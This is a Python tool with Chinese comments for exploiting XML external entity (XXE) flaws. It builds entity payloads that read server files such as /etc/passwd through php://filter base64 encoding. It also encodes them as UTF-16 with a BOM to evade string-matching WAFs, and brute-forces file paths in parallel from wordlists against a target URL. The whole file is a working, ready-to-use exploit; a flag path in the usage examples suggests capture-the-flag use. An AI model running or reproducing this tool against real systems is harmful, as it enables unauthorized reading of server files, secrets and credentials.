#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
xxe_read_probe.py — XXE 任意文件读取探测/利用工具 (distilled from xxe_file_probe.py + xxe_probe_parallel.py)

共性能力: 向存在 XXE 的接口提交带外部实体的 XML, 实体指向 php://filter base64 读取目标文件,
响应中回显实体内容, 提取并 base64 解码得到文件内容。支持 UTF-16 BOM 编码绕过按字符串过滤的 WAF。
仅依赖 Python 标准库 (urllib + concurrent.futures), 单路径探测与词表组合爆破统一为一种用法。

用法示例:
  # 单文件探测
  python3 xxe_read_probe.py --url http://TARGET/api.php?endpoint=import \
      --header "X-Admin-Key: secret" --path /etc/passwd

  # 词表组合爆破 (base_dirs x names, 并行)
  python3 xxe_read_probe.py --url http://TARGET/api.php?endpoint=import \
      --dirs-file dirs.txt --names-file names.txt --threads 20 --verbose

  # 自定义 XML 模板 (模板内用 __ENTITY__ 标记实体引用位置, 如 <r><v>__ENTITY__</v></r>)
  python3 xxe_read_probe.py --url http://TARGET/parse --template tmpl.xml \
      --json-path r.0.v --path /flag.txt

  # 本地自检 (不依赖外部网络)
  python3 xxe_read_probe.py --selftest
"""
import argparse
import base64
import concurrent.futures
import json
import re
import sys
import urllib.error
import urllib.request

DEFAULT_TEMPLATE = ('<images><image><title>__ENTITY__</title><description>d</description>'
                    '<category>c</category><path>/uploads/a.jpg</path></image></images>')


def build_payload(entity, path, filter_="convert.base64-encode", template=None):
    """构造带外部实体的 XXE payload。实体指向 php://filter base64 读取 path。"""
    tpl = template if template is not None else DEFAULT_TEMPLATE
    decl = '<!ENTITY {e} SYSTEM "php://filter/read={f}/resource={p}">'.format(
        e=entity, f=filter_, p=path)
    body = tpl.replace('__ENTITY__', '&{e};'.format(e=entity))
    return '<?xml version="1.0"?>\n<!DOCTYPE {e}_doc [\n{decl}\n]>\n{body}'.format(
        e=entity, decl=decl, body=body)


def encode_payload(xml_text, encoding="utf-16"):
    """UTF-16: 加 BOM + UTF-16-LE(绕过按字符串匹配的 WAF); UTF-8: 明文。"""
    if encoding == "utf-16":
        return b'\xff\xfe' + xml_text.encode('utf-16-le')
    return xml_text.encode('utf-8')


def extract_by_path(obj, path):
    """从解析后的 JSON 中按点号路径取值, 如 images.0.title -> obj['images'][0]['title']。"""
    cur = obj
    for part in path.split('.'):
        if isinstance(cur, list):
            try:
                cur = cur[int(part)]
            except (ValueError, IndexError, TypeError):
                return None
        elif isinstance(cur, dict):
            cur = cur.get(part)
        else:
            return None
    return cur


def decode_value(val, max_bytes=2000):
    """对回显值尝试 base64 解码(php://filter 场景), 不可解时原样返回。"""
    if val is None:
        return ''
    if isinstance(val, (dict, list)):
        val = json.dumps(val, ensure_ascii=False)
    s = str(val).strip()
    if not s:
        return s
    if re.fullmatch(r'[A-Za-z0-9+/=\s]+', s) and len(s) >= 8:
        try:
            raw = base64.b64decode(s)
            text = raw.decode('utf-8', 'replace')
            printable = sum(1 for ch in text if ch.isprintable() or ch in '\n\r\t')
            if raw and printable / max(1, len(text)) >= 0.85:
                return text[:max_bytes]
        except Exception:
            pass
    return s[:max_bytes]


def probe(url, headers, payload_bytes, timeout):
    """POST XML, 返回 (status, body_bytes); 网络错误时 status 为 None。"""
    req = urllib.request.Request(url, data=payload_bytes, method='POST')
    req.add_header('Content-Type', 'application/xml')
    for k, v in headers:
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(65536)
    except urllib.error.HTTPError as e:
        return e.code, e.read(65536)
    except Exception as e:  # noqa: BLE001
        return None, str(e).encode('utf-8', 'replace')


def parse_response(status, body, json_path):
    """取回显值: 优先按 json_path 提取; 否则把响应体当原文。"""
    text = body.decode('utf-8', 'replace')
    if not text.strip():
        return ''
    try:
        obj = json.loads(text)
    except Exception:
        return text
    if json_path:
        val = extract_by_path(obj, json_path)
        if val is not None:
            return val
    return text


def run(args):
    paths = list(args.path or [])
    if args.dirs_file and args.names_file:
        dirs = [l.strip() for l in open(args.dirs_file, encoding='utf-8', errors='replace') if l.strip()]
        names = [l.strip() for l in open(args.names_file, encoding='utf-8', errors='replace') if l.strip()]
        paths += [d.rstrip('/') + '/' + n for d in dirs for n in names]
    if not paths:
        sys.exit('error: 需要至少一个 --path, 或 --dirs-file + --names-file')
    template = open(args.template, encoding='utf-8').read() if args.template else DEFAULT_TEMPLATE
    headers = []
    for h in args.header or []:
        if ':' in h:
            k, v = h.split(':', 1)
            headers.append((k.strip(), v.strip()))
    print('url={} paths={} threads={} entity={} filter={} encoding={} json_path={}'.format(
        args.url, len(paths), args.threads, args.entity, args.filter, args.encoding, args.json_path),
        flush=True)

    found = []

    def work(path):
        xml = build_payload(args.entity, path, args.filter, template)
        data = encode_payload(xml, args.encoding)
        status, body = probe(args.url, headers, data, args.timeout)
        content = decode_value(parse_response(status, body, args.json_path), args.max_bytes)
        return path, status, content

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as ex:
        for path, status, content in ex.map(work, paths):
            if content and content.strip():
                found.append((path, status, content))
                print('[FOUND] {} => {}'.format(path, content[:args.max_bytes]), flush=True)
            elif args.verbose:
                print('[NO] {} => status={} echo={!r}'.format(path, status, content[:120]), flush=True)
    print('=== done: {}/{} found ==='.format(len(found), len(paths)), flush=True)


def selftest():
    """本地自检: 验证 payload 构造、UTF-16 编码、JSON 路径提取与 base64 解码, 不访问网络。"""
    xml = build_payload('xxe', '/etc/passwd')
    assert 'php://filter/read=convert.base64-encode/resource=/etc/passwd' in xml, 'filter/resource 缺失'
    assert '&xxe;' in xml, '实体引用缺失'
    data16 = encode_payload(xml, 'utf-16')
    assert data16[:2] == b'\xff\xfe', 'UTF-16 BOM 缺失'
    assert len(data16) % 2 == 0, 'UTF-16 字节数应为偶数'
    assert encode_payload(xml, 'utf-8')[:2] != b'\xff\xfe', 'UTF-8 不应带 BOM'

    sample = 'root:x:0:0:root:/root:/bin/bash\n'
    b64 = base64.b64encode(sample.encode()).decode()
    resp = {'images': [{'title': b64}]}
    assert extract_by_path(resp, 'images.0.title') == b64, 'JSON 路径提取失败'
    assert extract_by_path(resp, 'images.0.nope') is None, '缺失路径应返回 None'
    assert decode_value(extract_by_path(resp, 'images.0.title'), 2000) == sample, 'base64 解码回环失败'
    assert decode_value('纯文本回显, 非 base64') == '纯文本回显, 非 base64', '非 base64 值应原样返回'
    assert decode_value('') == '', '空值应返回空串'

    print('selftest OK')
    return 0


def main():
    p = argparse.ArgumentParser(
        description='XXE 任意文件读取探测: php://filter base64 + UTF-16 WAF 绕过 + 词表并行')
    p.add_argument('--url', help='目标接口 URL (POST, 如 http://HOST/api.php?endpoint=import)')
    p.add_argument('--header', action='append', help='附加请求头 "Name: value", 可重复')
    p.add_argument('--path', action='append', help='要读取的文件路径, 可重复')
    p.add_argument('--dirs-file', help='基础目录词表 (与 --names-file 笛卡尔积)')
    p.add_argument('--names-file', help='文件名词表')
    p.add_argument('--threads', type=int, default=10, help='并发线程数 (默认 10)')
    p.add_argument('--entity', default='xxe', help='外部实体名 (默认 xxe)')
    p.add_argument('--filter', default='convert.base64-encode', help='php://filter 过滤器 (默认 base64)')
    p.add_argument('--encoding', default='utf-16', choices=['utf-16', 'utf-8'], help='XML 编码 (默认 utf-16 带 BOM 绕 WAF)')
    p.add_argument('--json-path', default='images.0.title', help='JSON 响应中实体回显位置 (点号路径)')
    p.add_argument('--template', help='自定义 XML 模板文件 (内含 __ENTITY__ 标记)')
    p.add_argument('--max-bytes', type=int, default=2000, help='回显内容截断长度 (默认 2000)')
    p.add_argument('--timeout', type=float, default=10, help='单请求超时秒数 (默认 10)')
    p.add_argument('--verbose', action='store_true', help='同时打印未命中的路径')
    p.add_argument('--selftest', action='store_true', help='本地自检核心逻辑后退出')
    args = p.parse_args()
    if args.selftest:
        sys.exit(selftest())
    if not args.url:
        p.error('--url 必填 (或使用 --selftest)')
    run(args)


if __name__ == '__main__':
    main()
